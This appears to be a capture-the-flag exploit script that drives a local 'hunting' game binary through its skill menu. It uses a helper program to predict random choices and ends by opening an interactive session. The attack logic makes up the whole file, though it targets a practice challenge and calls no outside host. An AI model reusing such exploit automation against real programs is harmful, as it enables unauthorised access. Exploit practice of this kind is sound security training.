#!/usr/bin/env python
from sc_pwn import *

#==========
def attack(cmn, rand):
    cmn.set_show('RAW')
    hunting = Hunting(cmn)
    for i in range(82):
        choice = get_choice(rand)
        hunting.UseSkill(choice)

    for i in range(2):
        sleep(1)
        hunting.ChangeSkill(2)
        get_choice(rand)

        choice = get_choice(rand)
        hunting.UseSkill(choice)

        hunting.ChangeSkill(7)
        get_choice(rand)
        get_choice(rand)
        get_choice(rand)

        choice = get_choice(rand)
        hunting.UseSkill(choice)

    cmn.set_show()

def get_choice(cmn):
    cmn.sendln('')
    n = int(cmn.read_all())

    if n==0:
        return 1
    elif n==1:
        return 3
    elif n==2:
        return 2
    return 0

class Hunting:
    def __init__(self, cmn):
        self.read_all = cmn.read_all
        self.read_until = cmn.read_until
        self.sendln = cmn.sendln

    def UseSkill(self, n):
        self.read_all()
        #self.read_until('6. Exit\nchoice:')
        self.sendln('2')
        self.sendln(str(n))

    def ChangeSkill(self, n):
        self.read_all()
        #self.read_until('6. Exit\nchoice:')
        self.sendln('3')
	#self.read_until('9. hollylight\nchoice:')
        self.sendln(str(n))
        
#==========

if __name__=='__main__':
    #cmn = Communicate('stdbuf -o0 ./hunting', 'LOCAL')
    cmn = Communicate('./hunting', 'LOCAL')
    rand = Communicate('./random_choice', 'LOCAL')
    attack(cmn, rand)

    Interact(cmn).worker(False)
    
    del(cmn)
    del(rand)
    
#==========
